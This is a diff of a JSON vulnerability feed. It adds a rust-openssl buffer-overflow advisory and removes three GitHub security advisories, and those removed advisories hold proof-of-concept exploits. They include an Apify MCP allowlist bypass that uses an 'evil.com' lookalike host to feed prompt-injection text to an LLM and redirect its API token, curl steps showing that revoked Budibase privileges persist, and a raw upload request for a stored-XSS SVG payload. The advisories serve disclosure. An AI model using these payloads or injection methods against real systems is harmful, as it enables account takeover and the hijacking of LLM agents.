@@ -1,91 +1,31 @@
 {
-  "candidate_count": 3,
+  "candidate_count": 1,
   "candidates": [
     {
-      "canonical_id": "CVE-2026-46341",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-183",
-        "CWE-20"
-      ],
-      "description": "### Summary\nThe `fetch-apify-docs` tool validates URLs against a domain allowlist using `String.startsWith()` instead of proper URL hostname comparison. This allows bypass via attacker-controlled subdomains (e.g., `https://docs.apify.com.evil.com/`), enabling the tool to fetch and return arbitrary web content to the LLM.\n\n### Details\n#### Vulnerable component\n\n`src/tools/common/fetch_apify_docs.ts`, line 51:\n\n```typescript\nconst isAllowedDomain = ALLOWED_DOC_DOMAINS.some((domain) => url.startsWith(domain));\n```\n\n`src/const.ts`, lines 167-170:\n\n```typescript\nexport const ALLOWED_DOC_DOMAINS = [\n    'https://docs.apify.com',\n    'https://crawlee.dev',\n] as const;\n```\n\n#### How the bypass works\n\n`String.startsWith('https://docs.apify.com')` matches any string beginning with that prefix, including:\n\n- `https://docs.apify.com.evil.com/payload` - attacker-controlled subdomain\n- `https://docs.apify.com@evil.com/payload` - userinfo component in URL (browser behavior varies, but `fetch()` in Node.js may follow this)\n- `https://docs.apify.com.evil.com:8080/path` - custom port on attacker domain\n\nAll of these pass the `startsWith` check because they begin with the exact string `https://docs.apify.com`.\n\n#### The fetched content is returned to the LLM\n\nAfter the allowlist check passes, the tool fetches the URL and returns the full page content as markdown (`fetch_apify_docs.ts:69-103`):\n\n```typescript\nconst response = await fetch(url);\n// ...\nconst html = await response.text();\nmarkdown = htmlToMarkdown(html);\n// ...\nreturn buildMCPResponse({ texts: [`Fetched content from ${url}:\\n\\n${markdown}`], ... });\n```\n\nThe HTML is converted to markdown and returned verbatim to the LLM. This creates a prompt injection vector - the attacker's page can contain instructions that the LLM may follow.\n\nWhile tools like `get-html-skeleton` have no domain allowlist at all - it accepts any URL. The `fetch-apify-docs` tool was clearly intended to be more restricted (documentation-only), but the `startsWith` check defeats that intent.\n\n### PoC\n```json\n{\n  \"method\": \"tools/call\",\n  \"params\": {\n    \"name\": \"fetch-apify-docs\",\n    \"arguments\": {\n      \"url\": \"https://docs.apify.com.evil.com/prompt-injection-payload\"\n    }\n  }\n}\n```\n\nThe URL passes the `startsWith('https://docs.apify.com')` check, fetches the attacker's page, and returns its content to the LLM.\n### Impact\n- **Prompt injection via fetched content**: Attacker hosts a page at `docs.apify.com.evil.com` containing LLM instructions. When the tool fetches and returns this content, the LLM may follow the injected instructions.\n- **Security boundary violation**: The allowlist was explicitly designed to restrict fetching to trusted documentation domains. The bypass defeats this intent.\n- **SSRF (limited)**: The tool can fetch from attacker-controlled servers, though the primary risk is the content returned to the LLM rather than network access.\n- **Account compromise via _meta.apifyToken**: Injected prompt instructions can direct the LLM to include a specific `_meta.apifyToken` (the server's per-request token feature) in subsequent `call-actor` invocations, redirecting billable operations to a victim's account or accessing their private Actors",
-      "first_seen": "2026-05-19T19:11:13.015253+00:00",
+      "canonical_id": "CVE-2026-45784",
+      "composite_confidence": 0.85,
+      "cwe": [],
+      "description": "`CipherCtxRef::cipher_update_inplace` incorrectly sized output buffers when used with AES key-wrap-with-padding ciphers (EVP_aes_{128,192,256}_wrap_pad). For a non-multiple-of-8 input, OpenSSL writes up to 7 bytes past the end of the caller's buffer or Vec, producing attacker-controllable heap corruption when the plaintext length is attacker-influenced.\n\nThis only impacts users using AES key-wrap-with-padding ciphers.\n\nThis method was missed in the fix for GHSA-xv59-967r-8726",
+      "first_seen": "2026-05-19T20:05:57.892832+00:00",
       "frameworks": [
-        "npm"
+        "crates.io:openssl"
       ],
       "key_kind": "cve",
       "languages": [],
-      "last_seen": "2026-05-19T19:11:13.015253+00:00",
+      "last_seen": "2026-05-19T20:05:57.892832+00:00",
       "merged_sources": [
-        "ghsa"
+        "osv"
       ],
       "proactive_only": false,
       "raw_records_count": 1,
       "references": [
-        "https://github.com/advisories/GHSA-jwp7-wg77-3w9v",
-        "https://github.com/apify/apify-mcp-server/security/advisories/GHSA-jwp7-wg77-3w9v"
+        "https://github.com/rust-openssl/rust-openssl",
+        "https://github.com/rust-openssl/rust-openssl/security/advisories/GHSA-phqj-4mhp-q6mq"
       ],
       "severity": "medium",
       "source_count": 1,
-      "title": "Apify Model Context Protocol (MCP) server: Domain Allowlist Bypass in fetch-apify-docs via String Prefix Matching"
-    },
-    {
-      "canonical_id": "CVE-2026-46424",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-269"
-      ],
-      "description": "## Summary\n\nThe public API role unassignment endpoint (`POST /api/public/v1/roles/unassign`) updates user documents in CouchDB but does not invalidate the corresponding Redis user cache entries. Because the authentication middleware resolves user identity and permissions from this cache (TTL: 3600 seconds), a user whose admin, builder, or app-level roles have been revoked via the public API retains those privileges for up to 1 hour.\n\n## Details\n\nThe root cause is an inconsistency between the `UserDB.save()` and `UserDB.bulkUpdate()` code paths.\n\n**Vulnerable path** \u2014 `packages/pro/src/sdk/publicApi/roles.ts:49-75`:\n```typescript\nexport async function unAssign(userIds: string[], opts: AssignmentOpts) {\n  // ... modifies user objects: deletes roles, admin, builder ...\n  await userDB.bulkUpdate(users)  // line 74\n}\n```\n\n`bulkUpdate` delegates to `bulkUpdateGlobalUsers()` at `packages/backend-core/src/users/users.ts:82-85`:\n```typescript\nexport async function bulkUpdateGlobalUsers(users: User[]) {\n  const db = getGlobalDB()\n  return (await db.bulkDocs(users)) as BulkDocsResponse\n}\n```\n\nThis writes directly to CouchDB with **no cache invalidation**.\n\n**Correct path** \u2014 `packages/backend-core/src/users/db.ts:355` (used by admin UI):\n```typescript\nawait cache.user.invalidateUser(response.id)\n```\n\n**Cache configuration** \u2014 `packages/backend-core/src/cache/user.ts:11`:\n```typescript\nconst EXPIRY_SECONDS = 3600  // 1 hour TTL\n```\n\n**Authentication middleware** \u2014 `packages/backend-core/src/middleware/authenticated.ts:153-160`:\n```typescript\nuser = await getUser({\n  userId,\n  tenantId: session.tenantId,\n  email: session.email,\n})\n```\n\n`getUser()` reads from Redis cache first; it only falls back to CouchDB on cache miss. After `unAssign` updates CouchDB without invalidating Redis, every authenticated request continues to use the stale cached user object with the old (revoked) privileges.\n\nNotably, other bulk operations in the codebase handle this correctly \u2014 `groups.addUsers()` and `groups.removeUsers()` in `packages/pro/src/sdk/groups/groups.ts` both loop through affected users and call `cache.user.invalidateUser()` after `bulkUpdateGlobalUsers()`. The public API roles path was missed.\n\n## PoC\n\n```bash\n# Prerequisites: Enterprise license, admin API key, a second user with admin role\n\n# Step 1: Confirm user has admin access\ncurl -s -X GET http://localhost:10000/api/global/roles \\\n  -H 'Cookie: budibase:auth=<target-user-session>' \\\n  -H 'x-budibase-app-id: app_xyz'\n# Returns 200 with roles list\n\n# Step 2: Revoke admin role via public API\ncurl -s -X POST http://localhost:10000/api/public/v1/roles/unassign \\\n  -H 'x-budibase-api-key: <admin-api-key>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"userIds\": [\"<target-user-id>\"], \"admin\": true}'\n# Returns 200 \u2014 role removed from CouchDB\n\n# Step 3: Verify DB was updated (admin field removed)\n# (check CouchDB directly - user document no longer has admin: {global: true})\n\n# Step 4: Immediately retry admin endpoint as revoked user\ncurl -s -X GET http://localhost:10000/api/global/roles \\\n  -H 'Cookie: budibase:auth=<target-user-session>' \\\n  -H 'x-budibase-app-id: app_xyz'\n# STILL returns 200 \u2014 stale cache serves old admin privileges\n\n# Step 5: Wait for cache expiry (up to 3600 seconds) and retry\n# After cache expires, the request correctly returns 403\n```\n\n## Impact\n\nA user whose admin, builder, or app-level roles have been revoked via the public API retains full access to those privileges for up to 1 hour. This is particularly concerning in automated offboarding scenarios where HR/IT systems use the public API to revoke access for terminated employees \u2014 the terminated user retains admin/builder access to all applications and data during the cache window.\n\nThe impact is bounded by:\n- Requires enterprise license (expanded public API feature)\n- Maximum 1-hour window before cache expires\n- Only affects the public API revocation path; revocations via the admin UI (`UserDB.save()`) invalidate cache correctly\n- The `assign` direction has the inverse issue (newly granted roles are delayed) but this is less security-critical\n\n## Recommended Fix\n\nAdd cache invalidation to `bulkUpdateGlobalUsers` or to the callers that need it. The most targeted fix is in the `unAssign` function:\n\n```typescript\n// packages/pro/src/sdk/publicApi/roles.ts\nimport { cache } from \"@budibase/backend-core\"\n\nexport async function unAssign(userIds: string[], opts: AssignmentOpts) {\n  // ... existing role removal logic ...\n  await userDB.bulkUpdate(users)\n  \n  // Invalidate cache for all affected users\n  await Promise.all(\n    users.map(user => cache.user.invalidateUser(user._id!))\n  )\n}\n```\n\nAlternatively, fix it at the `bulkUpdate` level to prevent future callers from having the same gap:\n\n```typescript\n// packages/backend-core/src/users/db.ts\nstatic async bulkUpdate(users: User[]) {\n  const result = await usersCore.bulkUpdateGlobalUsers(users)\n  await Promise.all(\n    users.map(user => cache.user.invalidateUser(user._id!))\n  )\n  return result\n}\n```\n\nThe same fix should also be applied to the `assign` function in the same file.",
-      "first_seen": "2026-05-19T19:11:13.015358+00:00",
-      "frameworks": [
-        "npm"
-      ],
-      "key_kind": "cve",
-      "languages": [],
-      "last_seen": "2026-05-19T19:11:13.015358+00:00",
-      "merged_sources": [
-        "ghsa"
-      ],
-      "proactive_only": false,
-      "raw_records_count": 1,
-      "references": [
-        "https://github.com/Budibase/budibase/releases/tag/3.38.2",
-        "https://github.com/Budibase/budibase/security/advisories/GHSA-6vp2-6r7m-2jvx",
-        "https://github.com/advisories/GHSA-6vp2-6r7m-2jvx"
-      ],
-      "severity": "medium",
-      "source_count": 1,
-      "title": "Budibase: Missing Cache Invalidation on Public API Role Unassignment Allows Revoked Users to Retain Privileges for Up to 1 Hour"
-    },
-    {
-      "canonical_id": "CVE-2026-46426",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-434",
-        "CWE-79"
-      ],
-      "description": "### Summary\nThe file upload endpoint `POST /api/attachments/process` does not enforce active-content restrictions for authenticated users. The checks for dangerous file extensions (`html`, `svg`, `js`, `php`, etc.) are conditionally wrapped inside `if (isPublicUser)` or `if (isPublicUser || !env.SELF_HOSTED)`, meaning any authenticated builder can upload executable web content \u2014 SVG files with inline `<script>` tags, HTML pages with JavaScript, `.js` modules \u2014 which are then stored in the object store (MinIO/S3) with their correct MIME types (`image/svg+xml`, `text/html`, `application/javascript`). When the resulting signed URL is opened by any app user, the browser executes the payload.\n\nImpact is **persistent stored XSS** over all application end users.\n\n### Details\nThe vulnerability exists in a single handler function uploadFile shared by two routes, located in packages/server/src/api/controllers/static/index.ts (lines 93\u2013179).\n\nRoute definitions (packages/server/src/api/routes/static.ts):\n\nPOST /api/attachments/process              \u2192 authorized(BUILDER)\nPOST /api/attachments/:tableId/upload      \u2192 authorized(PermissionType.TABLE, PermissionLevel.WRITE)\nBoth routes invoke the same uploadFile function. The second endpoint is accessible to any authenticated app user (BASIC or POWER role) who has been granted WRITE on any table \u2014 not just builders.\n\n### PoC\n\n### Prerequisites\n\n- Budibase self-hosted Docker deployment, any version \u2264 3.30.6\n- An account with Builder role (does **not** require admin)\n- Target app published and accessible to end users\n\n### Step 1 \u2014 Authenticate as builder\n\n```http\nPOST /api/global/auth/default/login HTTP/1.1\nHost: target:10000\nContent-Type: application/json\n\n{\"username\":\"builder@company.com\",\"password\":\"BuilderPass1!\"}\n```\n\n```\nHTTP/1.1 200 OK\nSet-Cookie: budibase:auth=<jwt>; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT\nSet-Cookie: budibase:auth.sig=<sig>; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT\n\n{\"message\":\"Login successful\"}\n```\n\nThe CSRF token is bound to the session. Browsers send it automatically via the Budibase\nfrontend JS. For scripted requests, decode the JWT payload (base64url second segment) to\nextract `sessionId`, then read the Redis key `session-<userId>/<sessionId>` \u2192 `csrfToken`.\n\n### Step 2 \u2014 Upload SVG with XSS payload\n\n```http\nPOST /api/attachments/process HTTP/1.1\nHost: target:10000\nCookie: budibase:auth=<jwt>; budibase:auth.sig=<sig>\nx-budibase-app-id: <dev_app_id>\nx-csrf-token: <csrf_token>\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXXXXXXXXXXXXXXX\nContent-Length: 391\n\n------WebKitFormBoundaryXXXXXXXXXXXXXXXX\nContent-Disposition: form-data; name=\"file\"; filename=\"xss.svg\"\nContent-Type: image/svg+xml\n\n<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.domain)</script></svg>\n------WebKitFormBoundaryXXXXXXXXXXXXXXXX--\n```\n\n```json\nHTTP/1.1 200 OK\n\n[{\"size\":207,\"name\":\"xss.svg\",\"url\":\"http://target:10000/files/signed/.../<uuid>.svg?X-Amz-...\",\"extension\":\"svg\",\"key\":\"workspace_id/attachments/<uuid>.svg\"}]\n```\n### Impact\n* App end users - Stored XSS on any screen containing the attachment URL. Session cookie theft \u2192 full account takeover. |\n* Builder accounts - If malicious URL is shared within the workspace (table attachment, embedded image), XSS fires in builder's session \u2192 workspace takeover. \n\n\n<img width=\"3087\" height=\"1489\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b0ee0263-85de-430e-9575-88ec91eae565\" />\n\n\n<img width=\"2100\" height=\"1016\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5133bb1e-f637-479e-952f-14b3265129b4\" />\n\n\n\n\n\n\n\n--------\nDiscovered By:\nAbdulrahman Albatel\nAbdullah Alrasheed",
-      "first_seen": "2026-05-19T19:11:13.015305+00:00",
-      "frameworks": [
-        "npm"
-      ],
-      "key_kind": "cve",
-      "languages": [],
-      "last_seen": "2026-05-19T19:11:13.015305+00:00",
-      "merged_sources": [
-        "ghsa"
-      ],
-      "proactive_only": false,
-      "raw_records_count": 1,
-      "references": [
-        "https://github.com/Budibase/budibase/releases/tag/3.38.2",
-        "https://github.com/Budibase/budibase/security/advisories/GHSA-82rc-gxrg-v4gf",
-        "https://github.com/advisories/GHSA-82rc-gxrg-v4gf"
-      ],
-      "severity": "high",
-      "source_count": 1,
-      "title": "Budibase: Unrestricted Upload of File with Dangerous Type"
+      "title": "rust-openssl: Potential out-of-bounds write in `CipherCtxRef::cipher_update_inplace` for AES-KW-PAD ciphers"
     }
   ],
-  "correlated_at": "2026-05-19T19:11:17.780364+00:00"
+  "correlated_at": "2026-05-19T20:05:59.777281+00:00"
 }
